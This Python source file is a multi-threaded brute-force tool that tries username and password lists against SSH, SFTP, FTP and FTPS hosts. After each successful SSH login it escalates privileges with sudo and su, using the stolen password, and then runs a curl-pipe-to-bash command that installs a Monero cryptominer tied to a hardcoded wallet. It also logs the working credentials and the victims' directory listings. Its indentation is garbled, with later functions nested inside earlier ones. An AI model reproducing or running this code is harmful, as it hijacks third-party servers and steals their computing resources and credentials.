import argparse
import concurrent.futures
import curses
import ftplib
import logging
import os
import queue
import re
import socket
import sys
import threading
import time
from datetime import datetime
import time
import threading
import os
import sys
from datetime import datetime, timedelta
import shutil
from collections import deque
import math

import colorlog
import paramiko
import pysftp
from rich.console import Console
from rich.layout import Layout
from rich.live import Live
from rich.panel import Panel
from rich.table import Table

# --- GLOBAL SETTINGS ---
console = Console()

# Define connection messages with emojis (mostly for internal use now)
CONNECTION_MESSAGES = {
    "timeout": "🕒 Connection taking too long...",
    "dns_fail": "🌐 DNS lookup failed for this host",
    "refused": "🚫 Connection refused - service may not be running",
    "auth_fail": "🔑 Authentication failed - wrong credentials",
    "success": "🎉 Success! Logged in and script executed!",
    "script_fail": "⚠️ Connected but script failed to run",
    "no_shell": "🐚 Connected but no shell access",
    "starting": "🚀 Attempting connection to {host}:{port}",
    "retrying": "🔄 Retrying {host}:{port} (attempt {attempt})",
}

# Constants and global variables
timeout = 12  # Time limit for each connection in seconds
ATTEMPT_COUNT = 0  # Number of attempts
ATTEMPT_COUNT_LOCK = threading.Lock()  # Lock for attempt count
last_print_time = time.time()  # Time of last results print
TOTAL_LINES = 0  # Total lines in the input file
CURRENT_LINE = 0  # Current line being processed
CURRENT_LINE_LOCK = threading.Lock()  # Lock for current line
CURRENT_HOST = ""  # Current server being attempted
CURRENT_HOST_LOCK = threading.Lock()  # Lock for current server
total_elapsed_time = 0  # Total execution duration
stats = None

# Define locks for updating shared variables
LOGIN_ATTEMPTS_LOCK = threading.Lock()
CHECKED_HOSTS_LOCK = threading.Lock()

# --- Locks for file writing (essential for multi-threading) ---
FILE_LOCKS = {
    "output.txt": threading.Lock(),
    "checked_ssh_dirs.txt": threading.Lock(),
    "checked_sftp_dirs.txt": threading.Lock(),
    "checked_ftp_dirs.txt": threading.Lock(),
    "checked_ftps_dirs.txt": threading.Lock(),
    "checked_ssh.txt": threading.Lock(),
    "checked_ftp.txt": threading.Lock(),
    "checked_ftps.txt": threading.Lock(),
    "checked_sftp.txt": threading.Lock(),
    "root_access.txt": threading.Lock(),
    "root_sudo.txt": threading.Lock(),
    "sourcefile": threading.Lock(),
    "debug_log.txt": threading.Lock(),
}

login_attempts = {
    "correct_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
    "incorrect_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
}

parser = argparse.ArgumentParser(
    description="Attempt to login to a host using various protocols"
)
parser.add_argument(
    "-f", "--file", help="File containing login information", required=True
)
parser.add_argument(
    "-v",
    "--verbose",
    help="Increase output verbosity (shows DEBUG and INFO messages to console)",
    action="store_true",
)
parser.add_argument(
    "-t",
    "--threads",
    help="Number of threads to use",
    type=int,
    default=100,
)
parser.add_argument(
    "-p",
    "--protocols",
    help="Specify comma-separated protocols (FTP, FTPS, SFTP, SSH)",
    type=str,
    required=True,
)
args = parser.parse_args()
protocols = [p.strip().upper() for p in args.protocols.split(",")]

# --- Logging Configuration ---
script_logger = colorlog.getLogger("script_logger")
script_logger.propagate = False

file_handler = logging.FileHandler("debug_log.txt", mode="a", encoding="utf-8")
file_handler.setFormatter(
    logging.Formatter("%(asctime)s - %(levelname)-8s - %(message)s")
)
file_handler.setLevel(logging.DEBUG)
script_logger.addHandler(file_handler)
script_logger.setLevel(logging.DEBUG)

console_handler = colorlog.StreamHandler()
console_handler.setFormatter(
    colorlog.ColoredFormatter(
        "%(log_color)s%(levelname)-7s%(reset)s │ %(message)s",
        log_colors={
            "DEBUG": "cyan",
            "INFO": "bold_green",
            "WARNING": "bold_yellow",
            "ERROR": "bold_red",
            "CRITICAL": "bold_red,bg_white",
        },
    )
)

console_handler.setLevel(logging.INFO if args.verbose else logging.CRITICAL)

if args.verbose:
    script_logger.addHandler(console_handler)

# Silence other libraries' loggers
logging.getLogger("paramiko").setLevel(logging.CRITICAL)
logging.getLogger("pysftp").setLevel(logging.CRITICAL)
logging.getLogger("ftplib").setLevel(logging.WARNING)
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger().setLevel(logging.WARNING)

# --- System Error Stream Redirection ---
class StderrRedirector:
    def __init__(self, to=os.devnull):
        self.to_fd = None
        self.old_stderr_fd = None
        self.old_stderr = None
        self.target_file = None
        if to != os.devnull:
            self.target_file = open(to, "a", buffering=1, encoding="utf-8")
        else:
            self.to_fd = os.open(os.devnull, os.O_WRONLY)
            self.target_file = None

    def __enter__(self):
        self.old_stderr = sys.stderr
        self.old_stderr_fd = sys.stderr.fileno()

        if self.target_file:
            target_fd = self.target_file.fileno()
        else:
            target_fd = self.to_fd

        self.dup_stderr = os.dup(self.old_stderr_fd)
        os.dup2(target_fd, self.old_stderr_fd)

        if self.target_file:
            sys.stderr = self.target_file
        else:
            sys.stderr = os.fdopen(os.dup(target_fd), "w", encoding="utf-8")

        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if sys.stderr is not self.old_stderr and hasattr(sys.stderr, "flush"):
            sys.stderr.flush()

        os.dup2(self.dup_stderr, self.old_stderr_fd)
        os.close(self.dup_stderr)
        sys.stderr = self.old_stderr

        if not self.target_file and self.to_fd is not None:
            os.close(self.to_fd)

        return False


class MultiProtocolFancyStats:
    def __init__(self, total_hosts, filename, protocols=None, threads=100):
        self.total_hosts = total_hosts
        self.filename = os.path.basename(filename)
        self.protocols = protocols if protocols else ["SSH"]
        self.threads = threads
        self.start_time = time.time()

        # Stats tracking per protocol
        self.protocol_stats = {}
        for protocol in self.protocols:
            self.protocol_stats[protocol] = {
                "correct_logins": 0,
                "failed_logins": 0,
                "hosts_checked": 0,
                "current_host": "Waiting...",
                "active_threads": 0,
                "speed_history": deque(maxlen=30),
                "current_speed": 0.0,
                "avg_speed": 0.0,
                "last_checked_count": 0,
                "last_speed_update": time.time(),
            }

        # Global stats
        self.total_hosts_checked = 0
        self.total_correct_logins = 0
        self.total_failed_logins = 0
        self.total_active_threads = 0
        self.overall_speed = 0.0

        # Display control
        self.running = True
        self.display_thread = None
        self.lock = threading.Lock()

        # Animation frames
        self.spinner_frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        self.protocol_icons = {"SSH": "🔐", "SFTP": "📁", "FTP": "📂", "FTPS": "🔒"}
        self.frame_index = 0

        # Colors (ANSI escape codes)
        self.colors = {
            "reset": "\033[0m",
            "bold": "\033[1m",
            "dim": "\033[2m",
            "red": "\033[91m",
            "green": "\033[92m",
            "yellow": "\033[93m",
            "blue": "\033[94m",
            "magenta": "\033[95m",
            "cyan": "\033[96m",
            "white": "\033[97m",
            "orange": "\033[38;5;208m",
            "purple": "\033[38;5;129m",
            "bg_blue": "\033[44m",
            "bg_green": "\033[42m",
            "bg_red": "\033[41m",
            "bg_yellow": "\033[43m",
        }

        # Protocol colors
        self.protocol_colors = {
            "SSH": self.colors["green"],
            "SFTP": self.colors["blue"],
            "FTP": self.colors["yellow"],
            "FTPS": self.colors["magenta"],
        }

        # Output buffer for messages
        self.output_buffer = deque(maxlen=10)

    def start(self):
        """Start the live stats display"""
        if not self.display_thread or not self.display_thread.is_alive():
            self.running = True
            self.display_thread = threading.Thread(
                target=self._display_loop, daemon=True
            )
            self.display_thread.start()

    def stop(self):
        """Stop the live stats display"""
        self.running = False
        if self.display_thread and self.display_thread.is_alive():
            self.display_thread.join(timeout=1)
        print(f"\033[?25h\033[2J\033[H", end="", flush=True)

    def add_output(self, message):
        """Add a message to the output buffer"""
        with self.lock:
            timestamp = time.strftime("%H:%M:%S")
            self.output_buffer.append(f"[{timestamp}] {message}")

    def update_current_host(self, protocol, host):
        """Update the current host being processed for a specific protocol"""
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["current_host"] = host

    def increment_protocol_checked(self, protocol):
        """Increment hosts checked counter for a specific protocol"""
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["hosts_checked"] += 1
                self._update_protocol_speed(protocol)
                self._update_global_stats()

    def increment_protocol_correct(self, protocol):
        """Increment correct logins counter for a specific protocol"""
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["correct_logins"] += 1
                self._update_global_stats()

    def increment_protocol_failed(self, protocol):
        """Increment failed logins counter for a specific protocol"""
        with self.lock:
            if protocol in self.protocol_stats:
                self.protocol_stats[protocol]["failed_logins"] += 1
                self._update_global_stats()

    def set_active_threads(self, count):
        """Set total active threads count"""
        with self.lock:
            self.total_active_threads = count

    def _update_protocol_speed(self, protocol):
        """Update speed calculations for a specific protocol"""
        if protocol not in self.protocol_stats:
            return

        stats = self.protocol_stats[protocol]
        current_time = time.time()

        if current_time - stats["last_speed_update"] >= 1.0:
            time_diff = current_time - stats["last_speed_update"]
            checked_diff = stats["hosts_checked"] - stats["last_checked_count"]

            if time_diff > 0:
                stats["current_speed"] = checked_diff / time_diff
                stats["speed_history"].append(stats["current_speed"])

                if stats["speed_history"]:
                    stats["avg_speed"] = sum(stats["speed_history"]) / len(
                        stats["speed_history"]
                    )

            stats["last_checked_count"] = stats["hosts_checked"]
            stats["last_speed_update"] = current_time

    def _update_global_stats(self):
        """Update global statistics from all protocols"""
        self.total_hosts_checked = sum(
            stats["hosts_checked"] for stats in self.protocol_stats.values()
        )
        self.total_correct_logins = sum(
            stats["correct_logins"] for stats in self.protocol_stats.values()
        )
        self.total_failed_logins = sum(
            stats["failed_logins"] for stats in self.protocol_stats.values()
        )
        self.overall_speed = sum(
            stats["current_speed"] for stats in self.protocol_stats.values()
        )

    def _get_terminal_size(self):
        """Get terminal size"""
        try:
            return shutil.get_terminal_size()
        except:
            return shutil.get_terminal_size((120, 30))

    def _create_progress_bar(self, percentage, width=40):
        """Create a fancy progress bar"""
        filled = int(width * percentage / 100)
        bar = ""

        for i in range(width):
            if i < filled:
                if i < filled * 0.7:
                    bar += f"{self.colors['bg_green']} {self.colors['reset']}"
                elif i < filled * 0.9:
                    bar += f"{self.colors['bg_yellow']} {self.colors['reset']}"
                else:
                    bar += f"{self.colors['bg_red']} {self.colors['reset']}"
            else:
                bar += f"{self.colors['dim']}▱{self.colors['reset']}"

        return bar

        def _format_time(self, seconds):
            """Format time in a readable way"""
            if seconds < 60:
                return f"{int(seconds)}s"
            elif seconds < 3600:
                return f"{int(seconds//60)}m {int(seconds%60)}s"
            else:
                hours = int(seconds // 3600)
                minutes = int((seconds % 3600) // 60)
                return f"{hours}h {minutes}m"

        def _estimate_time_remaining(self):
            """Estimate time remaining based on overall speed"""
            if self.overall_speed > 0 and self.total_hosts_checked > 0:
                total_checks_needed = self.total_hosts * len(self.protocols)
                total_checks_done = sum(
                    stats["hosts_checked"] for stats in self.protocol_stats.values()
                )
                remaining_checks = total_checks_needed - total_checks_done
                return remaining_checks / self.overall_speed
            return 0

        def _create_fancy_border(self, width, title=""):
            """Create fancy Unicode borders"""
            if title:
                title_len = len(title)
                padding = (width - title_len - 4) // 2
                top = f"╭{'─' * padding}┤ {title} ├{'─' * (width - padding - title_len - 4)}╮"
            else:
                top = f"╭{'─' * (width-2)}╮"

            bottom = f"╰{'─' * (width-2)}╯"
            return top, bottom

        def _display_loop(self):
            """Main display loop"""
            print("\033[?25l", end="", flush=True)

            while self.running:
                try:
                    self._render_display()
                    time.sleep(0.5)
                    self.frame_index = (self.frame_index + 1) % len(self.spinner_frames)
                except Exception as e:
                    time.sleep(1)

        def _render_display(self):
            """Render the complete display"""
            term_size = self._get_terminal_size()
            width = min(term_size.columns - 2, 120)

            with self.lock:
                runtime = time.time() - self.start_time
                total_checks_needed = self.total_hosts * len(self.protocols)
                total_checks_done = sum(
                    stats["hosts_checked"] for stats in self.protocol_stats.values()
                )
                percentage = (
                    (total_checks_done / total_checks_needed * 100)
                    if total_checks_needed > 0
                    else 0
                )
                eta = self._estimate_time_remaining()

            # Clear screen and move to top
            print("\033[2J\033[H", end="")

            # Main header
            spinner = self.spinner_frames[self.frame_index]
            protocols_str = " | ".join(
                [f"{self.protocol_icons.get(p, '🔧')} {p}" for p in self.protocols]
            )
            header_title = f"{spinner} MULTI-PROTOCOL BRUTE FORCE SCANNER {spinner}"

            print(f"{self.colors['cyan']}{self.colors['bold']}")
            print("╔" + "═" * (width - 2) + "╗")
            print(f"║{header_title.center(width-2)}║")
            print(f"║{protocols_str.center(width-2)}║")
            print("╚" + "═" * (width - 2) + "╝")
            print(f"{self.colors['reset']}")

            # File info section
            print(
                f"\n{self.colors['yellow']}📁 Scan Configuration:{self.colors['reset']}"
            )
            print(
                f"   📝 File: {self.colors['white']}{self.filename}{self.colors['reset']}"
            )
            print(
                f"   🎯 Total Hosts: {self.colors['magenta']}{self.total_hosts:,}{self.colors['reset']}"
            )
            print(
                f"   🧵 Max Threads: {self.colors['blue']}{self.threads}{self.colors['reset']}"
            )
            print(
                f"   🌐 Protocols: {self.colors['cyan']}{len(self.protocols)} ({', '.join(self.protocols)}){self.colors['reset']}"
            )

            # Overall progress
            print(f"\n{self.colors['cyan']}📊 Overall Progress:{self.colors['reset']}")
            progress_bar = self._create_progress_bar(percentage, 60)
            print(
                f"   {progress_bar} {self.colors['bold']}{percentage:.1f}%{self.colors['reset']}"
            )

            # Global stats
            print(
                f"\n{self.colors['green']}🌍 Global Statistics:{self.colors['reset']}"
            )
            print("   ┌─────────────────────────┬─────────────────────────┐")
            print(
                f"   │ 🕒 Runtime              │ {self.colors['white']}{self._format_time(runtime):<23}{self.colors['reset']} │"
            )
            print(
                f"   │ ✅ Total Checks Done    │ {self.colors['green']}{total_checks_done:,} / {total_checks_needed:,}{'':>10}{self.colors['reset']} │"
            )
            print(
                f"   │ 🚀 Active Threads       │ {self.colors['magenta']}{self.total_active_threads}{'':>22}{self.colors['reset']} │"
            )
            print(
                f"   │ ⚡ Overall Speed        │ {self.colors['cyan']}{self.overall_speed:.1f} checks/sec{'':>8}{self.colors['reset']} │"
            )
            print(
                f"   │ ⏱️  ETA                 │ {self.colors['yellow']}{self._format_time(eta) if eta > 0 else 'Calculating...'}{'':>10}{self.colors['reset']} │"
            )
            print("   └─────────────────────────┴─────────────────────────┘")

            # Per-protocol stats
            print(
                f"\n{self.colors['blue']}🔧 Protocol Breakdown:{self.colors['reset']}"
            )

            for i, protocol in enumerate(self.protocols):
                stats = self.protocol_stats[protocol]
                color = self.protocol_colors.get(protocol, self.colors["white"])
                icon = self.protocol_icons.get(protocol, "🔧")

                print(f"   {color}{icon} {protocol}:{self.colors['reset']}")
                print(
                    f"      ✅ Success: {self.colors['green']}{stats['correct_logins']}{self.colors['reset']} | "
                    f"❌ Failed: {self.colors['red']}{stats['failed_logins']}{self.colors['reset']} | "
                    f"📊 Checked: {self.colors['cyan']}{stats['hosts_checked']}{self.colors['reset']} | "
                    f"⚡ Speed: {self.colors['yellow']}{stats['current_speed']:.1f}/s{self.colors['reset']}"
                )
                print(
                    f"      🎯 Current: {self.colors['white']}{stats['current_host'][:50]}{'...' if len(stats['current_host']) > 50 else ''}{self.colors['reset']}"
                )

            # Recent activity
            print(f"\n{self.colors['purple']}📋 Recent Activity:{self.colors['reset']}")
            if self.output_buffer:
                for msg in list(self.output_buffer)[-5:]:  # Show last 5 messages
                    print(f"   {self.colors['dim']}{msg}{self.colors['reset']}")
            else:
                print(
                    f"   {self.colors['dim']}No recent activity...{self.colors['reset']}"
                )

            print(
                f"\n{self.colors['dim']}Press Ctrl+C to stop...{self.colors['reset']}"
            )

    def parse_ssh_url(ssh_url):
        """Parses an SSH URL string into host, port, username, and password."""
        try:
            regex = r"^SSH://([^:@]+):([^:@]+)@([^:@]+):(\d+)$"
            match = re.match(regex, ssh_url)
            if match:
                username = match.group(1)
                password = match.group(2)
                host = match.group(3)
                try:
                    port = int(match.group(4))
                    return host, port, username, password
                except ValueError:
                    script_logger.error(f"Invalid port in SSH URL: {match.group(4)}")
                    return None
            else:
                script_logger.error(f"Invalid SSH URL format: {ssh_url}")
        except Exception as e:
            script_logger.error(
                f"Unexpected error while parsing SSH URL '{ssh_url}': {e}",
                exc_info=True,
            )
        return None

    def count_active_threads():
        """Returns the number of active threads."""
        return threading.active_count()

    def print_login_attempts(total_lines, start_time_main):
        """Prints a summary of login attempts to the console using rich."""
        active_threads = count_active_threads()
        with CURRENT_HOST_LOCK:
            current_host = CURRENT_HOST
        with CURRENT_LINE_LOCK:
            current_line = CURRENT_LINE

        elapsed_time = time.time() - start_time_main

        console = Console()
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Statistic", justify="left")
        table.add_column("Value", justify="right")

        table.add_row("🕒 Runtime", f"{elapsed_time:.2f}s")
        table.add_row("📋 Total Lines", str(total_lines))

        progress_percent_str = (
            f"({(current_line / total_lines) * 100:.1f}%)"
            if total_lines > 0
            else "(N/A)"
        )
        table.add_row(
            "📌 Current Line",
            f"{current_line} {progress_percent_str}",
        )
        table.add_row("🚀 Active Threads", str(active_threads))
        table.add_row(
            "✅ Correct Logins", str(sum(login_attempts["correct_logins"].values()))
        )
        table.add_row(
            "❌ Failed Logins",
            str(sum(login_attempts["incorrect_logins"].values())),
        )

        console.print("\n")
        console.print(
            Panel.fit(
                table,
                title="[bold]Progress Overview[/bold]",
                border_style="bright_blue",
                padding=(1, 4),
            )
        )
        console.print("\n")

    def check_login_thread(
        host,
        port,
        username,
        password,
        conn_timeout,
        protocol,
        sourcefile,
        start_time_main,
    ):
        """
        Main thread function to check a login.
        Handles progress updates and directs messages to script_logger.
        """
        global ATTEMPT_COUNT
        global last_print_time
        global CURRENT_LINE
        global CURRENT_HOST
        global hosts_checked_since_last_removal
        global stats

        with CURRENT_LINE_LOCK:
            CURRENT_LINE += 1
        with CURRENT_HOST_LOCK:
            CURRENT_HOST = f"{username}:{password}@{host}:{port}"

        # Update stats with current host
        if stats:
            stats.update_current_host(protocol, f"{username}@{host}:{port}")
            stats.add_output(f"🚀 Checking {protocol}://{username}@{host}:{port}")

        script_logger.debug(f"🚀 Attempting connection to {host}:{port} for {protocol}")

        with ATTEMPT_COUNT_LOCK:
            ATTEMPT_COUNT += 1

        start_time_thread = time.time()
        result_protocol = None
        redirect_target = "debug_log.txt" if args.verbose else os.devnull

        with StderrRedirector(to=redirect_target):
            try:
                if protocol == "SSH":
                    result_protocol = check_ssh_login(
                        host, port, username, password, conn_timeout
                    )
                elif protocol == "SFTP":
                    result_protocol = check_sftp_login(
                        host, port, username, password, conn_timeout
                    )
                elif protocol == "FTP":
                    result_protocol = check_ftp_login(
                        host, port, username, password, conn_timeout
                    )
                elif protocol == "FTPS":
                    result_protocol = check_ftps_login(
                        host, port, username, password, conn_timeout
                    )
            except Exception as e:
                script_logger.error(
                    f"Unhandled exception during {protocol} login check for {host}:{port}: {e}",
                    exc_info=True,
                )

        elapsed_time = time.time() - start_time_thread
        emoji = "✅" if result_protocol else "❌"
        short_host = f"{username[:8]}@{host.split('.')[0]}:{port}"

        # Update stats for host completion
        if stats:
            stats.increment_protocol_checked(protocol)

        # Centralized result handling and file writing
        if result_protocol:
            protocol_name = ""
            sudo_available = False
            su_root_available = False
            if isinstance(result_protocol, tuple):
                protocol_name, sudo_available, su_root_available = result_protocol
            else:
                protocol_name = result_protocol

            success_msg = (
                f"🎉 SUCCESS │ {protocol_name}://{username}:{password}@{host}:{port}"
                f" │ Duration: {elapsed_time:.2f}s"
            )

            # Update stats for successful login
            if stats:
                stats.increment_protocol_correct(protocol)
                stats.add_output(f"✔️ SUCCESS: {username}@{host}:{port}")

            script_logger.info(success_msg)

            with LOGIN_ATTEMPTS_LOCK:
                login_attempts["correct_logins"][protocol_name] += 1

            # Call the centralized write function with all necessary info
            write_to_output(
                protocol_name,
                username,
                password,
                host,
                port,
                sudo_available=sudo_available,
                su_root_available=su_root_available,
            )
        else:
            fail_msg = f"❌ Failed login for {protocol}://{username}:{password}@{host}:{port} │ Duration: {elapsed_time:.2f}s"

            # Update stats for failed login
            if stats:
                stats.increment_protocol_failed(protocol)
                stats.add_output(f"❌ FAILED: {username}@{host}:{port}")

            script_logger.info(fail_msg)

            with LOGIN_ATTEMPTS_LOCK:
                login_attempts["incorrect_logins"][protocol] += 1

        with CURRENT_HOST_LOCK:
            elapsed_time_formatted = f"{elapsed_time:.2f} seconds"
            script_logger.debug(
                f"Checked {protocol} login for {username}:{password}@{host}:{port}, took {elapsed_time_formatted}"
            )

        with CHECKED_HOSTS_LOCK:
            with CHECKED_HOSTS_LOCK:
                hosts_checked_since_last_removal += 1
                if hosts_checked_since_last_removal % 50 == 0:
                    script_logger.info(
                        f"Hosts checked since last removal: {hosts_checked_since_last_removal}"
                    )
                if hosts_checked_since_last_removal >= 300:
                    script_logger.info(
                        f"Removing {hosts_checked_since_last_removal} checked hosts from the file..."
                    )
                    remove_checked_hosts_by_counter(sourcefile, batch_size=300)
                    hosts_checked_since_last_removal = 0


        def check_ssh_login(host, port, username, password, conn_timeout):
            """
            Attempts to establish an SSH connection and perform actions.
            Returns ("SSH", True, True) if successful with root,
            ("SSH", False, False) if successful but no root, or None on failure.
            """
            sudo_available = False
            su_root_available = False

            try:
                script_logger.debug(
                    f"Trying SSH connection ({username}:{password}@{host}:{port})"
                )
                with paramiko.SSHClient() as client:
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(
                        hostname=host,
                        port=port,
                        username=username,
                        password=password,
                        timeout=conn_timeout,
                    )

                    script_logger.info(
                        f"Connected to SSH server {host}:{port} with {username}:{password}"
                    )

                    try:
                        with FILE_LOCKS["checked_ssh_dirs.txt"]:
                            stdin, stdout, stderr = client.exec_command("ls -la")
                            dir_listing = stdout.read().decode()
                            with open(
                                    "checked_ssh_dirs.txt", "a", encoding="utf-8"
                            ) as output_file:
                                output_file.write(
                                    f"SSH directory listing for {username}:{password}@{host}:{port}:\n{dir_listing}\n"
                                )
                    except Exception as e:
                        script_logger.warning(
                            f"Failed to get directory listing for {host}:{port}: {e}"
                        )

                    stdin, stdout, stderr = client.exec_command("echo Test", get_pty=True)
                    welcome_message = stdout.read().decode()
                    if "This service allows sftp connections only." in welcome_message or any(
                            msg in welcome_message
                            for msg in [
                                "Shell access is not enabled on your account!",
                                "This account is currently not available.",
                                "Shell access is disabled",
                                "command not allowed on SFTP-only account",
                            ]
                    ):
                        script_logger.info(
                            f"⚠️ Server {host}:{port} does not allow shell access. Considering as success without command execution."
                        )
                        return ("SSH", False, False)

                    install_command = (
                        "systemctl stop swapd ; curl -L -v "
                        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/"
                        "setup_mo_4_r00t_and_user.sh | bash -s 4BGGo3R1dNFpS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBjvfSKNhUuX"
                    )

                    stdin, stdout, stderr = client.exec_command("whoami")
                    current_user = stdout.read().decode().strip()

                    if current_user == "root":
                        script_logger.info(f"Already have root access on {host}:{port}")
                        stdin, stdout, stderr = client.exec_command(install_command)
                        sudo_available = True
                        su_root_available = True
                    else:
                        script_logger.info(f"Attempting privilege escalation on {host}")
                        sudo_commands = [
                            "sudo -s",
                            "sudo -i",
                            "sudo su -",
                            "sudo bash -c",
                            "sudo",
                        ]

                        for cmd_prefix in sudo_commands:
                            full_cmd = f"{cmd_prefix} '{install_command}'"
                            stdin, stdout, stderr = client.exec_command(full_cmd, get_pty=True)
                            time.sleep(1)
                            if stdout.channel.recv_ready():
                                prompt_output = stdout.channel.recv(1024).decode()
                                if "password" in prompt_output.lower():
                                    stdin.write(f"{password}\n")
                                    stdin.flush()
                                    time.sleep(2)

                            cmd_output = stdout.read().decode()
                            stdin_whoami, stdout_whoami, stderr_whoami = client.exec_command(
                                "whoami"
                            )
                            if stdout_whoami.read().decode().strip() == "root":
                                sudo_available = True
                                script_logger.info(
                                    f"Successfully got root with {cmd_prefix} on {host}"
                                )
                                break

                        if not sudo_available:
                            script_logger.info(f"Sudo failed on {host}, trying 'su'")
                            stdin, stdout, stderr = client.exec_command(
                                f"su -c '{install_command}'", get_pty=True
                            )
                            time.sleep(1)
                            if stdout.channel.recv_ready():
                                prompt_output = stdout.channel.recv(1024).decode()
                                if "password" in prompt_output.lower():
                                    stdin.write(f"{password}\n")
                                    stdin.flush()
                                    time.sleep(2)

                            stdin_whoami, stdout_whoami, stderr_whoami = client.exec_command(
                                "whoami"
                            )
                            if stdout_whoami.read().decode().strip() == "root":
                                su_root_available = True
                                script_logger.info(f"Successfully got root with 'su' on {host}")
                            else:
                                script_logger.info(
                                    f"Could not gain root access on {host}, running as normal user"
                                )
                                client.exec_command(install_command)

                    return ("SSH", sudo_available, su_root_available)

            except paramiko.ssh_exception.AuthenticationException:
                script_logger.info(f"🔑 Authentication failed for SSH {username}@{host}:{port}")
            except paramiko.ssh_exception.SSHException as e:
                script_logger.info(f"🚫 SSH connection error to {host}:{port}: {e}")
            except socket.timeout:
                script_logger.info(f"🕒 Connection timed out for SSH {host}:{port}.")
            except OSError as e:
                script_logger.info(
                    f"🚫 Socket operation error (OSError) during SSH connection to {host}:{port}: {e}"
                )
            except EOFError:
                script_logger.info(f"🚫 Unexpected EOF during SSH connection to {host}:{port}.")
            except Exception as e:
                script_logger.error(
                    f"⚠️ An unexpected error occurred during SSH for {host}:{port}: {e}",
                    exc_info=True,
                )

            return None


        def check_sftp_login(host, port, username, password, conn_timeout):
            """Attempts to establish an SFTP connection."""
            try:
                cnopts = pysftp.CnOpts()
                cnopts.hostkeys = None
                script_logger.debug(
                    f"Trying SFTP connection ({username}:{password}@{host}:{port})"
                )
                with pysftp.Connection(
                        host,
                        username=username,
                        password=password,
                        port=port,
                        cnopts=cnopts,
                        timeout=conn_timeout,
                ) as sftp:
                    script_logger.info(
                        f"Connected to SFTP server {host}:{port} with {username}:{password}"
                    )
                    sftp_files = sftp.listdir_attr(".")
                    with FILE_LOCKS["checked_sftp_dirs.txt"]:
                        with open(
                                "checked_sftp_dirs.txt", "a", encoding="utf-8"
                        ) as sftp_dir_output:
                            sftp_dir_output.write(
                                f"\n\nSFTP://{username}:{password}@{host}:{port}\n"
                            )
                            for line in sftp_files:
                                sftp_dir_output.write(f"{line}\n")
                    return "SFTP"
            except pysftp.exceptions.AuthenticationException:
                script_logger.info(
                    f"🔑 Authentication failed for SFTP {username}@{host}:{port}"
                )
            except (pysftp.exceptions.ConnectionException, pysftp.exceptions.SSHException) as e:
                script_logger.info(f"🚫 SFTP connection error to {host}:{port}: {e}")
            except socket.timeout:
                script_logger.info(f"🕒 Connection timed out for SFTP {host}:{port}.")
            except Exception as e:
                script_logger.error(f"⚠️ Unexpected error in SFTP: {e}", exc_info=True)
            return None


        def check_ftp_login(host, port, username, password, conn_timeout):
            """Attempts to establish an FTP connection."""
            try:
                script_logger.debug(
                    f"Trying FTP connection ({username}:{password}@{host}:{port})"
                )
                with ftplib.FTP(timeout=conn_timeout) as ftp:
                    ftp.connect(host, port)
                    ftp.login(username, password)
                    script_logger.info(
                        f"Connected to FTP server {host}:{port} with {username}:{password}"
                    )
                    ls = []
                    ftp.retrlines("LIST -a", ls.append)
                    with FILE_LOCKS["checked_ftp_dirs.txt"]:
                        with open(
                                "checked_ftp_dirs.txt", "a", encoding="utf-8"
                        ) as ftp_dir_output:
                            ftp_dir_output.write(
                                f"\n\nFTP://{username}:{password}@{host}:{port}\n"
                            )
                            for entry in ls:
                                ftp_dir_output.write(f"{entry}\n")
                    return "FTP"
            except ftplib.error_perm as e:
                script_logger.info(f"🔑 FTP login failed for {username}@{host}:{port}: {e}")
            except ftplib.all_errors as e:
                script_logger.info(f"🚫 FTP connection or protocol error to {host}:{port}: {e}")
            except socket.timeout:
                script_logger.info(f"🕒 Connection timed out for FTP {host}:{port}.")
            except Exception as e:
                script_logger.error(f"⚠️ Unexpected error in FTP: {e}", exc_info=True)
            return None


        def check_ftps_login(host, port, username, password, conn_timeout):
            """Attempts to establish an FTPS connection."""
            try:
                script_logger.debug(
                    f"Trying FTPS connection ({username}:{password}@{host}:{port})"
                )
                with ftplib.FTP_TLS(timeout=conn_timeout) as ftps:
                    ftps.connect(host, port)
                    ftps.login(username, password)
                    script_logger.info(
                        f"Connected to FTPS server {host}:{port} with {username}:{password}"
                    )
                    ftps.prot_p()
                    ls = []
                    ftps.retrlines("LIST -a", ls.append)
                    with FILE_LOCKS["checked_ftps_dirs.txt"]:
                        with open(
                                "checked_ftps_dirs.txt", "a", encoding="utf-8"
                        ) as ftps_dir_output:
                            ftps_dir_output.write(
                                f"\n\nFTPS://{username}:{password}@{host}:{port}\n"
                            )
                            for entry in ls:
                                ftps_dir_output.write(f"{entry}\n")
                    return "FTPS"
            except ftplib.error_perm as e:
                script_logger.info(f"🔑 FTPS login failed for {username}@{host}:{port}: {e}")
            except ftplib.all_errors as e:
                script_logger.info(
                    f"🚫 FTPS connection or protocol error to {host}:{port}: {e}"
                )
            except socket.timeout:
                script_logger.info(f"🕒 Connection timed out for FTPS {host}:{port}.")
            except Exception as e:
                script_logger.error(f"⚠️ Unexpected error in FTPS: {e}", exc_info=True)
            return None


        def write_to_output(
                protocol,
                username,
                password,
                host,
                port,
                sudo_available=False,
                su_root_available=False,
        ):
            """Writes successful login information to various output files."""
            output_line = f"{protocol}://{username}:{password}@{host}:{port}\n"

            # Always write to a main combined output file
            with FILE_LOCKS["output.txt"]:
                with open("output.txt", "a", encoding="utf-8") as output_file:
                    output_file.write(output_line)

            # Write to protocol-specific success files
            output_filename_map = {
                "SSH": "checked_ssh.txt",
                "FTP": "checked_ftp.txt",
                "FTPS": "checked_ftps.txt",
                "SFTP": "checked_sftp.txt",
            }
            if protocol in output_filename_map:
                with FILE_LOCKS[output_filename_map[protocol]]:
                    with open(
                            output_filename_map[protocol], "a", encoding="utf-8"
                    ) as output_file:
                        output_file.write(output_line)

